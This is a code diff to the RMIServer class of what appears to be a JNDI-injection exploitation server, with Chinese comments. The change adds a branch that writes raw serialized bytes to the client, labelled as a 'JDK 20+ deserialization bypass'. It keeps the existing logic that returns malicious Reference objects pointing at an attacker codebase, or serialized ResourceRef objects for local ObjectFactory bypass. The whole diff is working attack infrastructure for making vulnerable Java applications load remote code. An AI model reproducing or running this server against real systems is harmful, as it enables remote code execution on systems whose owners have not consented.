@@ -180,41 +180,48 @@ public class RMIServer implements Runnable {
         System.out.println("[RMI] Is RMI.lookup call for " + object + " " + method);
 
         out.writeByte(TransportConstants.Return);// transport op
-        try (ObjectOutputStream oos = new MarshalOutputStream(out, Main.config.codebase)) {
-            oos.writeByte(TransportConstants.NormalReturn);
-            new UID().write(oos);
 
-            String path = "/" + object; // 获取路由
-            System.out.println("[RMI] Send result for " + path);
+        String path = "/" + object; // 获取路由
+        System.out.println("[RMI] Send result for " + path);
 
-            // 路由分发, 为其匹配对应的 Controller 和方法
-            Object result;
+        // 路由分发, 为其匹配对应的 Controller 和方法
+        Object result;
 
-            if (Main.config.url != null) {
-                result = Dispatcher.getInstance().service(Main.config.url);
-            } else {
-                result = Dispatcher.getInstance().service(path);
-            }
+        if (Main.config.url != null) {
+            result = Dispatcher.getInstance().service(Main.config.url);
+        } else {
+            result = Dispatcher.getInstance().service(path);
+        }
 
-            ReferenceWrapper wrapper;
-
-            if (result instanceof Reference) {
-                // 返回序列化后的 Reference/ResourceRef 对象, 用于本地 ObjectFactory 绕过
-                wrapper = new ReferenceWrapper((Reference) result);
-            } else {
-                // 返回 Reference 对象, 指定 codebase, 用于常规 JNDI 注入
-                Reference ref = new Reference("foo", (String) result, Main.config.codebase);
-                wrapper = new ReferenceWrapper(ref);
-            }
-
-            Field refField = RemoteObject.class.getDeclaredField("ref");
-            refField.setAccessible(true);
-            refField.set(wrapper, new UnicastServerRef(12345));
-
-            oos.writeObject(wrapper);
-
-            oos.flush();
+        if (result instanceof byte[]) {
+            // JDK 20+ 反序列化绕过
+            out.write((byte[]) result);
             out.flush();
+        } else {
+            try (ObjectOutputStream oos = new MarshalOutputStream(out, Main.config.codebase)) {
+                oos.writeByte(TransportConstants.NormalReturn);
+                new UID().write(oos);
+
+                ReferenceWrapper wrapper;
+
+                if (result instanceof Reference) {
+                    // 返回序列化后的 Reference/ResourceRef 对象, 用于本地 ObjectFactory 绕过
+                    wrapper = new ReferenceWrapper((Reference) result);
+                } else {
+                    // 返回 Reference 对象, 指定 codebase, 用于常规 JNDI 注入
+                    Reference ref = new Reference("foo", (String) result, Main.config.codebase);
+                    wrapper = new ReferenceWrapper(ref);
+                }
+
+                Field refField = RemoteObject.class.getDeclaredField("ref");
+                refField.setAccessible(true);
+                refField.set(wrapper, new UnicastServerRef(12345));
+
+                oos.writeObject(wrapper);
+
+                oos.flush();
+                out.flush();
+            }
         }
     }
 
